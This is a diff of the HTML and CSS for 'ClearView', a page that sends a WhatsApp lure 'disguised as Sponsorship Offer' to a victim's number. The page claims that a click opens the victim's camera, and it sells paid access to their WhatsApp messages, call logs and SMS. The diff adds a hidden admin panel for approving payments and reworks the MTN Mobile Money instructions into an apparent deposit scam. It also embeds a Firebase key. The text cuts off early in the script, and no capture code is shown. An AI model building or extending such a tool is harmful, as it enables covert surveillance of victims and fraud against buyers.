@@ -27,6 +27,7 @@
       --warning: #f1c40f;
       --premium: #c9a84c;
       --mtn-yellow: #FFCC00;
+      --admin-bg: #1a0a0a;
       --radius: 18px;
       --radius-sm: 12px;
       --shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.6);
@@ -58,11 +59,12 @@
       gap: 1.5rem;
     }
 
-    /* Logo and Branding */
+    /* Brand Header */
     .brand-header {
       text-align: center;
       padding: 0.5rem;
       margin-bottom: -0.5rem;
+      user-select: none;
     }
 
     .brand-logo {
@@ -81,9 +83,149 @@
       color: var(--muted);
       font-style: italic;
       margin-top: 0.2rem;
+      cursor: pointer;
+      transition: all 0.3s;
     }
 
-    /* Saved Connections Section */
+    .brand-tagline:active {
+      color: var(--danger);
+    }
+
+    /* Admin Panel Styles */
+    .admin-panel {
+      background: var(--admin-bg);
+      border: 2px solid #ff4444;
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
+      display: none;
+      margin-bottom: 1rem;
+    }
+
+    .admin-panel.show {
+      display: block;
+      animation: slideDown 0.4s ease;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .admin-header h3 {
+      color: #ff4444;
+      font-size: 1.2rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .admin-toggle-btn {
+      background: #ff4444;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 25px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.8rem;
+      transition: all 0.3s;
+    }
+
+    .admin-toggle-btn:hover {
+      background: #ff6666;
+    }
+
+    .admin-pending-list {
+      display: grid;
+      gap: 0.8rem;
+    }
+
+    .pending-payment-card {
+      background: var(--panel-2);
+      border: 1px solid var(--premium);
+      border-radius: var(--radius-sm);
+      padding: 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .pending-phone {
+      font-weight: 600;
+      font-size: 1rem;
+    }
+
+    .pending-time {
+      font-size: 0.75rem;
+      color: var(--muted);
+    }
+
+    .admin-actions {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .unlock-btn {
+      background: var(--success);
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.8rem;
+      transition: all 0.3s;
+    }
+
+    .unlock-btn:hover {
+      background: #3ddc84;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 10px rgba(46, 204, 113, 0.4);
+    }
+
+    .reject-btn {
+      background: var(--danger);
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.8rem;
+      transition: all 0.3s;
+    }
+
+    .reject-btn:hover {
+      background: #ff7777;
+      transform: translateY(-2px);
+    }
+
+    .no-pending {
+      text-align: center;
+      color: var(--muted);
+      padding: 1rem;
+    }
+
+    /* Saved Connections */
     .saved-connections {
       background: var(--panel);
       padding: 1.5rem;
@@ -104,9 +246,6 @@
     .saved-header h3 {
       font-size: 1.1rem;
       font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 8px;
     }
 
     .saved-count {
@@ -131,7 +270,6 @@
       padding: 1rem;
       cursor: pointer;
       transition: all 0.3s;
-      position: relative;
     }
 
     .connection-card:hover {
@@ -139,24 +277,9 @@
       box-shadow: 0 5px 15px rgba(37, 211, 102, 0.2);
     }
 
-    .connection-card.active {
-      border-color: var(--success);
-      box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
-    }
-
-    .connection-card.locked {
-      border-color: var(--premium);
-    }
-
-    .connection-card.paid {
-      border-color: var(--success);
-      background: rgba(46, 204, 113, 0.05);
-    }
-
     .connection-phone {
       font-size: 1.1rem;
       font-weight: 700;
-      margin-bottom: 0.3rem;
     }
 
     .connection-status-badge {
@@ -168,25 +291,10 @@
       margin-top: 0.3rem;
     }
 
-    .badge-waiting {
-      background: rgba(241, 196, 15, 0.2);
-      color: var(--warning);
-    }
-
-    .badge-clicked {
-      background: rgba(201, 168, 76, 0.2);
-      color: var(--premium);
-    }
-
-    .badge-paid {
-      background: rgba(46, 204, 113, 0.2);
-      color: var(--success);
-    }
-
-    .badge-expired {
-      background: rgba(255, 94, 94, 0.2);
-      color: var(--danger);
-    }
+    .badge-waiting { background: rgba(241, 196, 15, 0.2); color: var(--warning); }
+    .badge-clicked { background: rgba(201, 168, 76, 0.2); color: var(--premium); }
+    .badge-paid { background: rgba(46, 204, 113, 0.2); color: var(--success); }
+    .badge-expired { background: rgba(255, 94, 94, 0.2); color: var(--danger); }
 
     .connection-time {
       font-size: 0.75rem;
@@ -200,72 +308,7 @@
       color: var(--muted);
     }
 
-    /* Sponsorship Banner */
-    .sponsor-banner {
-      background: linear-gradient(135deg, #1a2a1a 0%, #2a1a1a 100%);
-      padding: 1.5rem;
-      border-radius: var(--radius);
-      border: 1px solid #3a5a3a;
-      box-shadow: var(--shadow);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .sponsor-banner::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: linear-gradient(45deg, transparent 30%, rgba(37, 211, 102, 0.1) 100%);
-      pointer-events: none;
-    }
-
-    .sponsor-content {
-      position: relative;
-      z-index: 1;
-      display: flex;
-      gap: 1.5rem;
-      align-items: flex-start;
-      flex-wrap: wrap;
-    }
-
-    .sponsor-icon {
-      font-size: 3rem;
-      flex-shrink: 0;
-      animation: gentleFloat 3s ease-in-out infinite;
-    }
-
-    @keyframes gentleFloat {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-5px); }
-    }
-
-    .sponsor-text {
-      flex: 1;
-      min-width: 250px;
-    }
-
-    .sponsor-title {
-      font-size: 1.3rem;
-      font-weight: 700;
-      color: var(--accent);
-      margin-bottom: 0.5rem;
-      letter-spacing: 0.5px;
-    }
-
-    .sponsor-message {
-      font-size: 0.95rem;
-      color: #a8d5ba;
-      line-height: 1.7;
-      font-style: italic;
-      border-left: 3px solid var(--accent);
-      padding-left: 1rem;
-      margin-top: 0.5rem;
-    }
-
-    /* Phone number entry section */
+    /* Phone Section */
     .phone-section {
       background: var(--panel);
       padding: 1.5rem;
@@ -277,28 +320,6 @@
       gap: 1rem;
     }
 
-    .phone-header {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      flex-wrap: wrap;
-    }
-
-    .phone-header h2 {
-      font-size: 1.3rem;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .emotional-note {
-      font-size: 0.85rem;
-      color: var(--muted);
-      font-style: italic;
-      margin-top: 0.3rem;
-    }
-
     .phone-input-group {
       display: flex;
       gap: 1rem;
@@ -306,29 +327,20 @@
       align-items: center;
     }
 
-    .phone-input-wrapper {
+    .phone-input {
       flex: 1;
       min-width: 250px;
-      position: relative;
-    }
-
-    .phone-input {
-      width: 100%;
       padding: 1rem 1.2rem;
       background: var(--panel-2);
       border: 2px solid var(--border);
       border-radius: var(--radius-sm);
       color: var(--text);
       font-size: 1.2rem;
-      font-weight: 500;
-      letter-spacing: 1px;
-      transition: all 0.3s;
       outline: none;
     }
 
     .phone-input:focus {
       border-color: var(--accent);
-      box-shadow: 0 0 20px rgba(37, 211, 102, 0.2);
     }
 
     .send-whatsapp-btn {
@@ -345,62 +357,18 @@
       align-items: center;
       gap: 10px;
       box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
-      white-space: nowrap;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .send-whatsapp-btn::after {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(45deg, transparent 40%, rgba(255,255,255,0.2) 50%, transparent 60%);
-      animation: shimmer 3s infinite;
-    }
-
-    @keyframes shimmer {
-      0% { transform: translateX(-100%) rotate(45deg); }
-      100% { transform: translateX(100%) rotate(45deg); }
     }
 
     .send-whatsapp-btn:hover {
-      background: linear-gradient(135deg, #1da851 0%, #158f42 100%);
       transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(37, 211, 102, 0.5);
     }
 
-    .whatsapp-icon {
-      font-size: 1.5rem;
-      position: relative;
-      z-index: 1;
-    }
-
-    /* Link preview */
     .link-preview {
       background: var(--panel-2);
       border-radius: var(--radius-sm);
       padding: 1rem;
       border: 1px dashed var(--accent);
       display: none;
-      animation: slideDown 0.4s ease;
-    }
-
-    .link-preview.show {
-      display: block;
-    }
-
-    @keyframes slideDown {
-      from {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
     }
 
     .link-url {
@@ -408,17 +376,12 @@
       font-size: 0.9rem;
       color: var(--accent);
       word-break: break-all;
-      padding: 0.5rem;
-      background: #0d141d;
-      border-radius: 8px;
-      margin-top: 0.5rem;
     }
 
     .link-actions {
       display: flex;
       gap: 0.8rem;
       margin-top: 0.8rem;
-      flex-wrap: wrap;
     }
 
     .link-action-btn {
@@ -428,21 +391,9 @@
       background: var(--panel);
       color: var(--text);
       cursor: pointer;
-      font-weight: 500;
       font-size: 0.9rem;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      gap: 6px;
     }
 
-    .link-action-btn:hover {
-      border-color: var(--accent);
-      color: var(--accent);
-      background: var(--panel-2);
-    }
-
-    /* Connection status */
     .status-section {
       background: var(--panel);
       padding: 1rem 1.5rem;
@@ -455,13 +406,6 @@
       gap: 1rem;
     }
 
-    .connection-status {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 500;
-    }
-
     .status-indicator {
       width: 12px;
       height: 12px;
@@ -470,70 +414,20 @@
       animation: pulse 2s infinite;
     }
 
-    .status-indicator.waiting {
-      background: var(--warning);
-      box-shadow: 0 0 10px var(--warning);
-    }
-
-    .status-indicator.connected {
-      background: var(--success);
-      box-shadow: 0 0 15px var(--success);
-      animation: none;
-    }
-
-    .status-indicator.locked {
-      background: var(--premium);
-      box-shadow: 0 0 15px var(--premium);
-      animation: none;
-    }
-
-    .status-indicator.failed {
-      background: var(--danger);
-      box-shadow: 0 0 15px var(--danger);
-      animation: none;
-    }
+    .status-indicator.connected { background: var(--success); animation: none; }
+    .status-indicator.locked { background: var(--premium); animation: none; }
 
     @keyframes pulse {
       0%, 100% { opacity: 0.6; }
       50% { opacity: 1; }
     }
 
-    .status-details {
-      display: flex;
-      gap: 1rem;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-
-    .status-chip {
-      padding: 0.4rem 1rem;
-      border-radius: 20px;
-      background: var(--panel-2);
-      font-size: 0.8rem;
-      border: 1px solid var(--border);
-    }
-
-    /* Main grid */
-    .main-grid {
-      display: grid;
-      grid-template-columns: 1.5fr 1fr;
-      gap: 1.5rem;
-    }
-
-    @media (max-width: 800px) {
-      .main-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    .video-card, .info-card {
+    .video-card {
       background: var(--panel);
       border-radius: var(--radius);
       border: 1px solid var(--border);
       box-shadow: var(--shadow);
       overflow: hidden;
-      display: flex;
-      flex-direction: column;
     }
 
     .card-header {
@@ -542,26 +436,15 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      background: rgba(255,255,255,0.02);
-    }
-
-    .card-header h3 {
-      font-size: 1.1rem;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 8px;
     }
 
     .video-container {
-      flex: 1;
       min-height: 350px;
       background: #0a0e13;
       display: flex;
       align-items: center;
       justify-content: center;
       position: relative;
-      background-image: radial-gradient(circle at 30% 40%, #1a2634 0%, #070b10 90%);
     }
 
     #remoteVideo {
@@ -569,7 +452,6 @@
       height: 100%;
       min-height: 350px;
       object-fit: contain;
-      background: transparent;
       display: none;
     }
 
@@ -583,12 +465,6 @@
       padding: 2rem;
     }
 
-    .placeholder-icon {
-      font-size: 4rem;
-      opacity: 0.5;
-    }
-
-    /* Payment Overlays */
     .payment-overlay {
       position: fixed;
       top: 0;
@@ -600,15 +476,8 @@
       align-items: center;
       justify-content: center;
       z-index: 1000;
-      backdrop-filter: blur(8px);
-      animation: fadeIn 0.5s ease;
       overflow-y: auto;
       padding: 20px;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
     }
 
     .payment-card {
@@ -619,41 +488,7 @@
       max-width: 400px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
-      animation: slideUp 0.6s ease;
       margin: auto;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    @keyframes slideUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .payment-icon {
-      font-size: 3rem;
-      margin-bottom: 1rem;
-    }
-
-    .payment-title {
-      font-size: 1.3rem;
-      font-weight: 700;
-      color: var(--premium);
-      margin-bottom: 0.5rem;
-    }
-
-    .payment-subtitle {
-      font-size: 0.85rem;
-      color: var(--muted);
-      margin-bottom: 1rem;
-      line-height: 1.5;
     }
 
     .payment-amount {
@@ -661,26 +496,6 @@
       font-weight: 800;
       color: var(--premium);
       margin: 0.5rem 0;
-    }
-
-    .payment-features {
-      list-style: none;
-      padding: 0;
-      margin: 0.5rem 0;
-      text-align: left;
-    }
-
-    .payment-features li {
-      padding: 0.4rem;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 0.85rem;
-    }
-
-    .feature-check {
-      color: var(--success);
-      font-weight: 700;
     }
 
     .pay-now-btn {
@@ -692,175 +507,8 @@
       font-weight: 800;
       font-size: 1.1rem;
       cursor: pointer;
-      transition: all 0.3s;
       width: 100%;
-      box-shadow: 0 4px 15px rgba(201, 168, 76, 0.5);
       margin-top: 0.5rem;
-    }
-
-    .pay-now-btn:hover {
-      background: linear-gradient(135deg, #e8c96a 0%, #c9a84c 100%);
-      transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(201, 168, 76, 0.7);
-    }
-
-    .lifetime-badge {
-      display: inline-block;
-      background: rgba(201, 168, 76, 0.2);
-      color: var(--premium);
-      padding: 0.3rem 0.8rem;
-      border-radius: 20px;
-      font-size: 0.75rem;
-      font-weight: 600;
-      margin-top: 0.5rem;
-      border: 1px solid var(--premium);
-    }
-
-    .expiry-timer {
-      font-size: 1rem;
-      color: var(--accent-gold);
-      font-weight: 700;
-      margin: 0.5rem 0;
-      font-family: 'JetBrains Mono', monospace;
-    }
-
-    /* MTN Payment Page */
-    .mtn-payment-page {
-      background: linear-gradient(135deg, #1a2028 0%, #2a1a1a 100%);
-      border: 2px solid var(--mtn-yellow);
-      border-radius: var(--radius);
-      padding: 2rem;
-      max-width: 450px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
-      margin: auto;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    .mtn-logo {
-      background: var(--mtn-yellow);
-      color: #000;
-      font-weight: 900;
-      font-size: 2rem;
-      padding: 0.5rem 1rem;
-      border-radius: 10px;
-      display: inline-block;
-      margin-bottom: 1rem;
-    }
-
-    .mtn-title {
-      font-size: 1.5rem;
-      font-weight: 800;
-      color: var(--mtn-yellow);
-      margin-bottom: 0.5rem;
-    }
-
-    .mtn-steps {
-      text-align: left;
-      margin: 1rem 0;
-      padding: 0;
-      list-style: none;
-    }
-
-    .mtn-steps li {
-      padding: 0.8rem;
-      background: rgba(255, 204, 0, 0.1);
-      border-left: 3px solid var(--mtn-yellow);
-      margin-bottom: 0.5rem;
-      border-radius: 8px;
-      font-size: 0.9rem;
-      line-height: 1.5;
-    }
-
-    .mtn-number {
-      font-size: 1.5rem;
-      font-weight: 800;
-      color: var(--mtn-yellow);
-      margin: 1rem 0;
-      letter-spacing: 2px;
-    }
-
-    .mtn-amount-display {
-      font-size: 2rem;
-      font-weight: 800;
-      color: var(--success);
-      margin: 0.5rem 0;
-    }
-
-    .mtn-note {
-      font-size: 0.8rem;
-      color: var(--muted);
-      margin-top: 1rem;
-      font-style: italic;
-    }
-
-    .info-content {
-      padding: 1.5rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1.2rem;
-    }
-
-    .instruction-step {
-      display: flex;
-      gap: 1rem;
-      align-items: flex-start;
-      padding: 0.8rem;
-      background: var(--panel-2);
-      border-radius: var(--radius-sm);
-      border-left: 3px solid var(--accent);
-      transition: all 0.3s;
-    }
-
-    .step-number {
-      background: var(--accent);
-      color: white;
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      font-size: 0.9rem;
-      flex-shrink: 0;
-    }
-
-    .step-text {
-      flex: 1;
-      font-size: 0.9rem;
-      color: var(--text);
-      line-height: 1.5;
-    }
-
-    .step-text strong {
-      color: var(--accent);
-    }
-
-    .whatsapp-preview-box {
-      background: #1a2a1e;
-      border: 1px solid #2a4a2e;
-      border-radius: var(--radius-sm);
-      padding: 1rem;
-      margin-top: 0.5rem;
-    }
-
-    .whatsapp-message-preview {
-      background: #0d1a12;
-      border-radius: 10px;
-      padding: 1rem;
-      font-size: 0.9rem;
-      color: #c8e6c9;
-      line-height: 1.6;
-    }
-
-    .whatsapp-message-preview .highlight {
-      color: #4caf50;
-      font-weight: 600;
-      text-decoration: underline;
-      cursor: pointer;
     }
 
     .log-area {
@@ -871,17 +519,6 @@
       border-radius: 10px;
       max-height: 120px;
       overflow-y: auto;
-      border: 1px solid #1f2d3b;
-    }
-
-    .footer-note {
-      text-align: center;
-      font-size: 0.8rem;
-      color: var(--muted);
-      letter-spacing: 0.4px;
-      border-top: 1px solid var(--border);
-      padding-top: 1rem;
-      font-style: italic;
     }
 
     .whatsapp-float {
@@ -898,15 +535,8 @@
       justify-content: center;
       font-size: 2rem;
       cursor: pointer;
-      box-shadow: 0 4px 20px rgba(37, 211, 102, 0.5);
-      transition: all 0.3s;
       border: none;
       z-index: 100;
-    }
-
-    .whatsapp-float:hover {
-      transform: scale(1.1);
-      box-shadow: 0 8px 30px rgba(37, 211, 102, 0.7);
     }
   </style>
 </head>
@@ -916,244 +546,161 @@
   <!-- Brand Header -->
   <div class="brand-header">
     <div class="brand-logo">ClearView</div>
-    <div class="brand-tagline">Prove Your Instincts — Lifetime Access</div>
+    <div class="brand-tagline" id="brandTagline">Prove Your Instincts — Lifetime Access</div>
   </div>
 
-  <!-- Saved Connections Section -->
-  <div class="saved-connections" id="savedConnectionsSection">
+  <!-- Admin Panel (Hidden - Long press "Prove Your Instincts" to reveal) -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-header">
+      <h3>🔐 Admin Panel - Payment Approvals</h3>
+      <button class="admin-toggle-btn" id="adminToggleBtn">Hide Admin</button>
+    </div>
+    <div class="admin-pending-list" id="adminPendingList">
+      <div class="no-pending">No pending payments</div>
+    </div>
+  </div>
+
+  <!-- Saved Connections -->
+  <div class="saved-connections">
     <div class="saved-header">
       <h3><span>💾</span> Your Connected Devices <span class="saved-count" id="savedCount">0</span></h3>
       <span style="font-size: 0.8rem; color: var(--muted);">Click a device to reconnect</span>
     </div>
     <div class="connections-list" id="connectionsList">
-      <div class="empty-state" id="emptyState">
-        <p>No connections yet. Send your first link above.</p>
-      </div>
+      <div class="empty-state">No connections yet. Send your first link above.</div>
     </div>
   </div>
 
-  <!-- Phone Number Entry Section -->
+  <!-- Phone Section -->
   <div class="phone-section">
     <div class="phone-header">
       <h2><span>📱</span> Send link disguised as Sponsorship Offer</h2>
     </div>
-    <div class="emotional-note">
-      "Once they click, their camera and microphone will be accessed."
-    </div>
     <div class="phone-input-group">
-      <div class="phone-input-wrapper">
-        <input type="tel" 
-               class="phone-input" 
-               id="phoneInput" 
-               placeholder="+256 7XX XXX XXX" 
-               value="+256 700 000 000"
-               pattern="[0-9+\-\(\) ]+">
-        <span class="country-code">🌍</span>
+      <div class="phone-input-wrapper" style="flex:1;">
+        <input type="tel" class="phone-input" id="phoneInput" placeholder="+256 7XX XXX XXX" value="+256 700 000 000">
       </div>
       <button class="send-whatsapp-btn" id="sendWhatsAppBtn">
-        <span class="whatsapp-icon">💬</span>
-        <span class="btn-text">Send Sponsorship Link</span>
+        <span>💬</span> Send Sponsorship Link
       </button>
     </div>
 
-    <!-- Link Preview -->
     <div class="link-preview" id="linkPreview">
-      <div style="display: flex; justify-content: space-between; align-items: center;">
-        <strong style="color: var(--accent);">📎 Sponsorship Link Generated</strong>
-        <span style="font-size: 0.8rem; color: var(--muted);">Waiting for recipient to click</span>
-      </div>
       <div class="link-url" id="generatedLink"></div>
       <div class="link-actions">
-        <button class="link-action-btn" id="copyLinkBtn">
-          <span>📋</span> Copy Link
-        </button>
-        <button class="link-action-btn" id="openWhatsAppBtn">
-          <span>💬</span> Open WhatsApp
-        </button>
+        <button class="link-action-btn" id="copyLinkBtn">📋 Copy</button>
+        <button class="link-action-btn" id="openWhatsAppBtn">💬 WhatsApp</button>
       </div>
     </div>
   </div>
 
-  <!-- Connection Status -->
+  <!-- Status -->
   <div class="status-section">
-    <div class="connection-status">
+    <div style="display:flex; align-items:center; gap:10px;">
       <span class="status-indicator waiting" id="statusIndicator"></span>
       <span id="statusText">Ready to send link.</span>
     </div>
-    <div class="status-details">
-      <span class="status-chip" id="phoneChip">📱 +256 700 000 000</span>
-      <span class="status-chip" id="linkChip">🔗 Not generated</span>
-      <span class="status-chip" id="accessChip" style="display: none;">🔒 Waiting</span>
+    <div style="display:flex; gap:0.5rem;">
+      <span id="phoneChip" style="font-size:0.8rem;">📱 +256 700 000 000</span>
+      <span id="accessChip" style="display:none; font-size:0.8rem;">🔒 Waiting</span>
     </div>
   </div>
 
-  <!-- Main Grid -->
-  <div class="main-grid">
-    <!-- Video Card -->
-    <div class="video-card">
-      <div class="card-header">
-        <h3><span>🎥</span> Live Camera View</h3>
-        <span style="font-size: 0.8rem; color: var(--muted);" id="videoStatus">ClearView Stream</span>
-      </div>
-      <div class="video-container" id="videoContainer">
-        <video id="remoteVideo" autoplay playsinline></video>
-        <div class="video-placeholder" id="videoPlaceholder">
-          <div class="placeholder-icon">📷</div>
-          <strong>Waiting for camera access...</strong>
-          <span>Send link to begin</span>
-          <span style="font-size: 0.8rem; color: var(--muted);">ClearView — Camera Stream</span>
-        </div>
-      </div>
+  <!-- Video Card -->
+  <div class="video-card">
+    <div class="card-header">
+      <h3>🎥 Live Camera View</h3>
+      <span id="videoStatus" style="font-size:0.8rem; color:var(--muted);">ClearView Stream</span>
     </div>
-
-    <!-- Info Card -->
-    <div class="info-card">
-      <div class="card-header">
-        <h3><span>📋</span> How It Works</h3>
-      </div>
-      <div class="info-content">
-        <div class="instruction-step">
-          <div class="step-number">1</div>
-          <div class="step-text">
-            <strong>Enter their number</strong> — the device you want to access
-          </div>
-        </div>
-        <div class="instruction-step">
-          <div class="step-number">2</div>
-          <div class="step-text">
-            <strong>Send sponsorship link</strong> — disguised as an offer
-          </div>
-        </div>
-        <div class="instruction-step">
-          <div class="step-number">3</div>
-          <div class="step-text">
-            <strong>They click</strong> — camera access begins immediately
-          </div>
-        </div>
-        <div class="instruction-step">
-          <div class="step-number">4</div>
-          <div class="step-text">
-            <strong>Premium required</strong> — for WhatsApp, call logs & continued view
-          </div>
-        </div>
-        <div class="instruction-step">
-          <div class="step-number">5</div>
-          <div class="step-text">
-            <strong>Pay via MTN Mobile Money</strong> — $10 for lifetime access
-          </div>
-        </div>
-
-        <!-- WhatsApp Message Preview -->
-        <div class="whatsapp-preview-box">
-          <div style="font-size: 0.8rem; color: var(--muted); margin-bottom: 0.5rem;">
-            💬 WhatsApp message:
-          </div>
-          <div class="whatsapp-message-preview" id="whatsappMessagePreview">
-            🎉 <strong>Sponsorship Opportunity!</strong><br>
-            You've been selected for our exclusive program!<br>
-            <span class="highlight" id="previewLink">Click here to claim your spot</span><br>
-            <small style="color: #6a8a6a;">Limited spots available - Act now!</small>
-          </div>
-        </div>
-
-        <!-- Connection Log -->
-        <div class="log-area" id="logArea">
-          <div>Ready to send sponsorship offers.</div>
-        </div>
+    <div class="video-container">
+      <video id="remoteVideo" autoplay playsinline></video>
+      <div class="video-placeholder" id="videoPlaceholder">
+        <div style="font-size:3rem;">📷</div>
+        <strong>Waiting for camera access...</strong>
+        <span>Send link to begin</span>
       </div>
     </div>
   </div>
 
-  <div class="footer-note">
+  <!-- Log -->
+  <div class="log-area" id="logArea">
+    <div>Ready to send sponsorship offers.</div>
+  </div>
+
+  <div style="text-align:center; font-size:0.8rem; color:var(--muted); padding-top:1rem; font-style:italic;">
     "See what your instincts already know." — ClearView
   </div>
 </div>
 
-<!-- Payment Overlay (Premium Lock) -->
-<div class="payment-overlay" id="paymentOverlay" style="display: none;">
+<!-- Payment Overlay -->
+<div class="payment-overlay" id="paymentOverlay" style="display:none;">
   <div class="payment-card">
-    <div class="payment-icon">🔒</div>
-    <div class="payment-title">Full Access Required</div>
-    <div class="payment-subtitle">
-      Camera view is now locked. Pay for full access to continue viewing camera, WhatsApp messages, call logs, and SMS.
-    </div>
+    <div style="font-size:3rem;">🔒</div>
+    <h3 style="color:var(--premium); margin:0.5rem 0;">Full Access Required</h3>
+    <p style="color:var(--muted); font-size:0.85rem;">Camera view is locked. Pay for full access.</p>
     <div class="payment-amount">$10</div>
-    <div class="expiry-timer" id="expiryTimer">⏰ Expires in: 60:00</div>
-    <ul class="payment-features">
-      <li><span class="feature-check">✓</span> Continued live camera view</li>
-      <li><span class="feature-check">✓</span> WhatsApp messages access</li>
-      <li><span class="feature-check">✓</span> Call logs access</li>
-      <li><span class="feature-check">✓</span> SMS access</li>
-      <li><span class="feature-check">✓</span> Lifetime access - one payment</li>
+    <div id="expiryTimer" style="color:var(--accent-gold); font-weight:700;">⏰ Expires in: 60:00</div>
+    <ul style="list-style:none; padding:0; text-align:left; margin:0.5rem 0;">
+      <li>✓ Continued live camera view</li>
+      <li>✓ WhatsApp messages access</li>
+      <li>✓ Call logs access</li>
+      <li>✓ SMS access</li>
+      <li>✓ Lifetime access</li>
     </ul>
-    <button class="pay-now-btn" id="payNowBtn">
-      💳 Pay $10 Now
-    </button>
-    <div class="lifetime-badge">🔒 LIFETIME ACCESS</div>
+    <button class="pay-now-btn" id="payNowBtn">💳 Pay $10 Now</button>
+    <div style="margin-top:0.5rem; font-size:0.75rem; color:var(--premium);">🔒 LIFETIME ACCESS</div>
   </div>
 </div>
 
-<!-- MTN Payment Instructions Overlay -->
-<div class="payment-overlay" id="mtnPaymentOverlay" style="display: none;">
-  <div class="mtn-payment-page">
-    <div class="mtn-logo">MTN</div>
-    <div class="mtn-title">Mobile Money Payment</div>
-    <p style="color: var(--muted); margin-bottom: 1rem;">Follow these steps to complete payment:</p>
-    
-    <ol class="mtn-steps">
-      <li><strong>Dial *165#</strong> on your phone</li>
-      <li>Select <strong>Option 1: Send Money</strong></li>
-      <li>Enter the number: <strong>+256 700 123 456</strong></li>
-      <li>Enter amount: <strong>$10 (or UGX 37,000)</strong></li>
-      <li>Enter your <strong>MTN Mobile Money PIN</strong></li>
-      <li>Confirm the transaction</li>
+<!-- MTN Payment Overlay -->
+<div class="payment-overlay" id="mtnPaymentOverlay" style="display:none;">
+  <div class="payment-card" style="border-color:var(--mtn-yellow);">
+    <div style="background:var(--mtn-yellow); color:#000; font-weight:900; font-size:1.5rem; padding:0.3rem 1rem; border-radius:10px; display:inline-block; margin-bottom:1rem;">MTN</div>
+    <h3 style="color:var(--mtn-yellow); margin-bottom:0.5rem;">Mobile Money Payment</h3>
+    <p style="color:var(--muted); margin-bottom:1rem;">Follow these steps:</p>
+    <ol style="text-align:left; margin:1rem 0; padding-left:1.5rem; color:var(--text); font-size:0.85rem;">
+      <li>Dial *165#</li>
+      <li>Select option 1: MTN Mobile Money</li>
+      <li>Deposit $10 (UGX 37,000) onto your MTN line</li>
+      <li>The administrator will contact you via TikTok/platform for withdrawal</li>
+      <li>This protects both parties legally</li>
     </ol>
-    
-    <div class="mtn-amount-display">💰 $10 / UGX 37,000</div>
-    <div class="mtn-number">📱 +256 700 123 456</div>
-    
-    <div class="mtn-note">
-      ⚠️ You must have sufficient funds on your MTN Mobile Money account.<br>
-      After payment, access will be unlocked automatically.
-    </div>
-    
-    <button class="pay-now-btn" id="mtnDoneBtn" style="margin-top: 1rem;">
-      ✅ I've Paid - Unlock Access
-    </button>
+    <div style="font-size:1.5rem; font-weight:800; color:var(--success); margin:0.5rem 0;">💰 $10 / UGX 37,000</div>
+    <div style="font-size:0.8rem; color:var(--muted); margin-top:1rem;">⚠️ Must have sufficient funds on MTN Mobile Money</div>
+    <button class="pay-now-btn" id="mtnDoneBtn" style="margin-top:1rem;">✅ I've Paid - Request Unlock</button>
   </div>
 </div>
 
-<!-- Floating WhatsApp Button -->
-<button class="whatsapp-float" id="whatsappFloat" title="Send Sponsorship Link">
-  💬
-</button>
+<button class="whatsapp-float" id="whatsappFloat">💬</button>
 
 <script>
-  // Initialize Firebase
+  // Firebase
   const firebaseConfig = {
     apiKey: "AIzaSyDOeRWTL_BMjlYfRtAUklnZZ3xUxUfC40E",
     authDomain: "clearview-fcbeb.firebaseapp.com",
     projectId: "clearview-fcbeb",
     storageBucket: "clearview-fcbeb.firebasestorage.app",
     messagingSenderId: "652271153227",
